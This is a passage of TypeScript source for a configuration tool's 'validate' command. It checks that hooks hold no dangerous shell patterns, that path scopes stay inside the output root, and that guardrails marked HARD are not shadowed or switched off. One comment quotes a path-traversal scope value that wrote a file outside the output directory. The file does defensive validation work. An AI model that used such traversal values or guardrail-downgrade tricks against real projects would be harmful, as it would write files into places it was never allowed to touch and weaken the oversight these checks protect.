  // hook surface: compile.ts merges them into dist/claude/core/settings.json and
  // sync ships that to every spoke. The green tick therefore asserted a clean
  // sheet over a surface it had never read. Both surfaces, one check, one name
  // that says what was actually scanned.
  const result = check("hook commands — no dangerous shell patterns in org- or persona-authored hooks");

  const sources: Array<{ label: string; hooks: unknown }> = [
    { label: "claude.hooks", hooks: config.claude?.hooks },
  ];
  for (const { name, personaConfig } of enumeratePersonaConfigs(config, configDir)) {
    if (personaConfig.hooks) {
      sources.push({ label: `personas/${name} hooks`, hooks: personaConfig.hooks });
    }
  }

  for (const source of sources) {
    // A value the scanner cannot read must not be reported as scanned clean.
    for (const { event, found } of unscannableHookEvents(source.hooks)) {
      fail(
        result,
        `${source.label}.${event} is ${found}, expected a hook group object or an array of them — ` +
        `it cannot be scanned and cannot be compiled into a hook that runs`,
      );
    }
    for (const { event, command, why } of dangerousHookFindings(source.hooks)) {
      // fail(), not warn(). This command runs on every developer machine in
      // the org, and the operator can always rephrase it or move the logic
      // into a reviewed script the hook invokes by path.
      fail(result, `${source.label}.${event}: dangerous command — ${why}\n      ${command}`);
    }
  }
  return result;
}

/**
 * Every persona.config.json reachable from this hub, across the same four roots
 * `checkTraitReferences` walks (package defaults, hub core/, customDir, domain
 * layers). Shared so a new hook/permission surface cannot be scanned over three
 * of the four roots by accident.
 */
function enumeratePersonaConfigs(
  config: AgentBootConfig,
  configDir: string,
): Array<{ name: string; personaConfig: PersonaConfig }> {
  const roots: string[] = [
    path.join(ROOT, "core", "personas"),
    path.join(configDir, "core", "personas"),
  ];
  if (config.personas?.customDir) {
    const ext = path.resolve(configDir, config.personas.customDir);
    if (fs.existsSync(ext)) roots.push(ext);
  }
  for (const d of resolveDomainDirs(config, configDir)) {
    if (d.personasDir) roots.push(d.personasDir);
  }

  // Later roots override earlier ones by name, matching compile.ts's
  // package → hub → customDir precedence.
  const byName = new Map<string, PersonaConfig>();
  for (const root of roots) {
    if (!fs.existsSync(root)) continue;
    for (const personaName of fs.readdirSync(root)) {
      const personaDir = path.join(root, personaName);
      if (!fs.statSync(personaDir).isDirectory()) continue;
      const configPath = path.join(personaDir, "persona.config.json");
      if (!fs.existsSync(configPath)) continue;
      try {
        byName.set(
          personaName,
          JSON.parse(stripJsoncComments(fs.readFileSync(configPath, "utf-8"))) as PersonaConfig,
        );
      } catch {
        // Malformed JSON is already reported by checkTraitReferences; not
        // swallowed here, just not double-reported.
      }
    }
  }
  return [...byName].map(([name, personaConfig]) => ({ name, personaConfig }));
}

// ---------------------------------------------------------------------------
// B7: policy exceptions — well-formed, owned, and not expired
// ---------------------------------------------------------------------------

function checkPolicyExceptions(configDir: string): CheckResult {
  const result = check("Policy exceptions — well-formed, owned, and not expired");
  const file = path.join(configDir, HUB_EXCEPTIONS_FILE);
  if (!fs.existsSync(file)) return result;
  let list;
  try {
    list = loadExceptionsFile(file);
  } catch (e) {
    fail(result, `${HUB_EXCEPTIONS_FILE}: unreadable — ${e instanceof Error ? e.message : String(e)}`);
    return result;
  }
  const v = validateExceptions(list);
  for (const e of v.errors) fail(result, e);
  for (const w of v.warnings) warn(result, w);
  return result;
}

// ---------------------------------------------------------------------------
// Phase 11 C1.4: HARD guardrail override detection
// ---------------------------------------------------------------------------

/**
 * NF4-8: `validate` passed artifacts that `build` refuses.
 *
 * Two build gates had no pre-flight equivalent, so `agentboot validate` printed
 * "All 12 checks passed" and exited 0 on a hub that `agentboot build` then
 * rejected:
 *
 *   * an UNREADABLE path scope (NF2-3) — `paths: ["src/a/**"` with no closing
 *     bracket. An unreadable scope cannot be delivered as "no scope", because
 *     that delivers a narrow rule as always-on.
 *   * a path scope whose first segment ESCAPES the output root (60bc867) — the
 *     Gemini emitter derives a directory name from `paths:`, so
 *     `paths: "../../../../victim-repo/**"` wrote a GEMINI.md at that resolved
 *     location. That one is a CRITICAL, caught only at build.
 *
 * `build` is the real gate and nothing is written outside dist/ before it
 * refuses, so this is a pre-flight COMPLETENESS gap rather than a hole. It still
 * matters: validate is what a hub's CI runs on a PR, and a check that passes
 * everything the next stage will reject teaches people to skip it.
 *
 * Deliberately reads through the same `readScopeGlobs` and
 * `isSafeRelativeSegment` the build uses. A second parser here would be the
 * exact drift that produced seven hand-rolled scope readers in the first place.
 */
function checkScopeKeys(config: AgentBootConfig, configDir: string): CheckResult {
  const result = check(
    "Path scopes are readable and stay inside the output root (the same two gates `build` applies)",
  );

  const groups: Array<{ dir: string; key: "applyTo" | "paths"; enabled?: string[] | undefined }> = [
    { dir: path.join(configDir, "core", "instructions"), key: "applyTo", enabled: config.instructions?.enabled },
    { dir: path.join(configDir, "core", "gotchas"), key: "paths" },
  ];
  // Domains are compile inputs too — the gap NEW-1 closed on the build side.
  for (const domainRef of config.domains ?? []) {
    const domainPath = typeof domainRef === "string"
      ? path.resolve(configDir, domainRef)
      : path.resolve(configDir, domainRef.path ?? `./domains/${domainRef.name}`);
    groups.push({ dir: path.join(domainPath, "instructions"), key: "applyTo" });
  }

  for (const { dir, key, enabled } of groups) {
    if (!fs.existsSync(dir)) continue;
    for (const file of fs.readdirSync(dir).filter((f) => f.endsWith(".md"))) {
      const name = path.basename(file, ".md");
      if (enabled && !enabled.includes(name)) continue;
      const rel = path.relative(configDir, path.join(dir, file));
      const content = fs.readFileSync(path.join(dir, file), "utf-8");
      const { globs, malformed } = readScopeGlobs(content, key);
      if (malformed) {
        fail(
          result,
          `${rel}: ${key} is unreadable (${malformed}). \`build\` refuses this — an unreadable ` +
            `scope cannot be delivered as "no scope", which would deliver a narrow rule always-on.`,
        );
        continue;
      }
      for (const glob of globs) {
        // The first segment is what the Gemini emitter turns into a directory.
        // An ABSOLUTE glob splits to a leading EMPTY segment, so a `if (first)`
        // guard skips exactly the case that most obviously escapes — caught by
        // the validate-and-build-agree fixture rather than by reading the code.
        const first = glob.split(/[\\/]+/)[0] ?? "";
        const escapes = path.isAbsolute(glob) || (first !== "" && first !== "**" && !isSafeRelativeSegment(first));
        if (escapes) {
          fail(
            result,
            `${rel}: ${key} entry "${glob}" escapes the output root. \`build\` refuses this — ` +
              `the scope's first segment becomes a directory name under dist/.`,
          );
        }
      }
    }
  }
  return result;
}

function checkHardGuardrails(_config: AgentBootConfig, configDir: string): CheckResult {
  const result = check("HARD guardrail override protection — no lower scope shadows or downgrades a HARD artifact (does NOT test whether any target can enforce it — see `doctor`)");

  // Scan instruction and trait files for guardrail: hard frontmatter
  const hardArtifacts = new Map<string, string>(); // name → scope

  // Check core instructions
  const instructionsDir = path.join(configDir, "core", "instructions");
  if (fs.existsSync(instructionsDir)) {
    for (const file of fs.readdirSync(instructionsDir).filter(f => f.endsWith(".md"))) {
      const content = fs.readFileSync(path.join(instructionsDir, file), "utf-8");
      const fm = frontmatterBlock(content);
      if (fm !== null && /guardrail:\s*hard/i.test(fm)) {
        hardArtifacts.set(path.basename(file, ".md"), "core");
      }
    }
  }

  // Check core traits
  const traitsDir = path.join(configDir, "core", "traits");
  if (fs.existsSync(traitsDir)) {
    for (const file of fs.readdirSync(traitsDir).filter(f => f.endsWith(".md"))) {
      const content = fs.readFileSync(path.join(traitsDir, file), "utf-8");
      const fm = frontmatterBlock(content);
      if (fm !== null && /guardrail:\s*hard/i.test(fm)) {
        hardArtifacts.set(path.basename(file, ".md"), "core");
      }
    }
  }

  if (hardArtifacts.size === 0) return result; // No HARD artifacts — nothing to check

  // Scan scope nodes for overrides of HARD artifacts
  const checkScopeDir = (scopeDir: string, scopeLabel: string): void => {
    // A lower scope can also neutralise a HARD artifact by SHADOWING it — placing
    // a file of the same artifact name in its own instructions/ or traits/ dir,
    // typically with `guardrail: soft`. That path was previously caught only by
    // `agentboot audit`, as advisory text ("verify the override is intentional"),
    // which is right for shadowing a soft preference and wrong for downgrading a
    // HARD guardrail. This check makes it an error where it belongs.
    //
    // Note this fires regardless of whether scope-level instruction CONTENT is
    // currently compiled: the intent to weaken a HARD artifact is the defect, and
    // the check must not silently start passing or failing based on that.
    for (const sub of ["instructions", "traits"]) {
      const subDir = path.join(scopeDir, sub);
      if (!fs.existsSync(subDir)) continue;
      for (const file of fs.readdirSync(subDir).filter(f => f.endsWith(".md"))) {
        const artifactName = path.basename(file, ".md");
        if (!hardArtifacts.has(artifactName)) continue;
        const content = fs.readFileSync(path.join(subDir, file), "utf-8");
        const fm = frontmatterBlock(content);
        const isHard = fm !== null ? /guardrail:\s*hard/i.test(fm) : false;
        if (!isHard) {
          fail(result,
            `${scopeLabel} ${sub}/${file} shadows HARD artifact "${artifactName}" ` +
            `(defined at ${hardArtifacts.get(artifactName)}) without \`guardrail: hard\` — ` +
            `HARD guardrails cannot be downgraded or overridden at lower scopes`
          );
        }
      }
    }

    // Check persona configs for trait weight overrides
    const personasDir = path.join(scopeDir, "personas");
    if (fs.existsSync(personasDir)) {
      for (const dir of fs.readdirSync(personasDir)) {
        const configPath = path.join(personasDir, dir, "persona.config.json");
        if (!fs.existsSync(configPath)) continue;
        try {
          const pc = JSON.parse(stripJsoncComments(fs.readFileSync(configPath, "utf-8")));
          const traits = pc.traits;
          if (traits && typeof traits === "object" && !Array.isArray(traits)) {
            for (const [traitName, weight] of Object.entries(traits)) {
              const isOff = weight === 0 || weight === "0" ||
                (typeof weight === "string" && weight.toUpperCase() === "OFF");
              if (hardArtifacts.has(traitName) && isOff) {
                fail(result,
                  `${scopeLabel} persona "${dir}" sets HARD trait "${traitName}" to OFF — ` +
                  `HARD guardrails cannot be disabled at lower scopes`
                );
              }
            }
          }
        } catch { /* ignore malformed configs */ }
      }
    }
  };

  // Check groups/teams directories — BOTH team layouts (UI-7: compile accepts
  // sibling teams/<g>/<t>/ as well; a rogue override there must not be
  // invisible to validate).
  const groupsDir = path.join(configDir, "groups");
  if (fs.existsSync(groupsDir)) {
    for (const group of fs.readdirSync(groupsDir)) {
      checkScopeDir(path.join(groupsDir, group), `group/${group}`);
      const teamsDir = path.join(groupsDir, group, "teams");
      if (fs.existsSync(teamsDir)) {
        for (const team of fs.readdirSync(teamsDir)) {
          checkScopeDir(path.join(teamsDir, team), `team/${group}/${team}`);
        }
      }
    }
  }
  const siblingTeamsDir = path.join(configDir, "teams");
  if (fs.existsSync(siblingTeamsDir)) {
    for (const group of fs.readdirSync(siblingTeamsDir)) {
      const gDir = path.join(siblingTeamsDir, group);
      if (!fs.statSync(gDir).isDirectory()) continue;
      for (const team of fs.readdirSync(gDir)) {
        const tDir = path.join(gDir, team);
        if (fs.statSync(tDir).isDirectory()) {
          checkScopeDir(tDir, `team/${group}/${team}`);
        }
      }
    }
  }

  // Check nodes directories
  const nodesDir = path.join(configDir, "nodes");
  if (fs.existsSync(nodesDir)) {
    const walkNodes = (dir: string, label: string): void => {
      for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
        if (entry.isDirectory()) {
          const childLabel = `${label}/${entry.name}`;
          checkScopeDir(path.join(dir, entry.name), childLabel);
          walkNodes(path.join(dir, entry.name), childLabel);
        }
      }
    };
    walkNodes(nodesDir, "nodes");
  }

  return result;
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

async function main(): Promise<void> {
  const argv = process.argv.slice(2);
  const configPath = resolveHubConfigOrExit(argv, "validate");
  const forceStrict = argv.includes("--strict");

  console.log(chalk.bold("\nAgentBoot — validate"));
  console.log(chalk.gray(`Config: ${configPath}\n`));

  const config = loadConfigOrExit(configPath, "validate");
  const configDir = path.dirname(configPath);
  const strictMode = forceStrict || (config.validation?.strictMode ?? false);

  if (strictMode) {
    console.log(chalk.yellow("  ⚑ Strict mode: warnings treated as errors\n"));
  }

  // Run all checks.
  const checks: CheckResult[] = [
    checkPersonaExistence(config, configDir),
    checkTraitReferences(config, configDir),
    checkSkillFrontmatter(config, configDir),
    checkNoSecrets(config, configDir),
    checkCompositionConsistency(config, configDir),
    checkRuleOverrides(config, configDir),
    checkMcpGovernance(config),
    checkMcpPinning(config),
    checkClaudeSettingsPassthrough(config),
    checkDangerousHooks(config, configDir),
    checkPolicyExceptions(configDir),
    checkHardGuardrails(config, configDir),
    checkScopeKeys(config, configDir),
    checkArtifactIdentity(configDir),
  ];

  // Print results.
  for (const c of checks) {
    printResult(c, strictMode);
  }

  // Summary.
  const failures = checks.filter((c) => isEffectiveFail(c, strictMode));
  const warnings = checks.reduce((acc, c) => acc + c.warnings.length, 0);

  console.log("");
  if (failures.length === 0) {
    console.log(
      chalk.bold(
        chalk.green(`✓ All ${checks.length} checks passed`) +
          (warnings > 0 ? chalk.yellow(` (${warnings} warning${warnings > 1 ? "s" : ""})`) : "")
      )
    );
    process.exit(0);
  } else {
    const errorCount = failures.reduce((acc, c) => acc + c.errors.length, 0);
    console.log(
      chalk.bold(
        chalk.red(
          `✗ ${failures.length} check${failures.length > 1 ? "s" : ""} failed ` +
            `(${errorCount} error${errorCount > 1 ? "s" : ""}, ` +
            `${warnings} warning${warnings > 1 ? "s" : ""})`
        )
      )
    );
    process.exit(1);
  }
}

// Only run main() when executed directly, not when imported for testing
const isDirectRun = process.argv[1]?.includes("validate");
if (isDirectRun) {
  main().catch((err: unknown) => {
    console.error(chalk.red("Unexpected error:"), err);
    process.exit(1);
  });
}
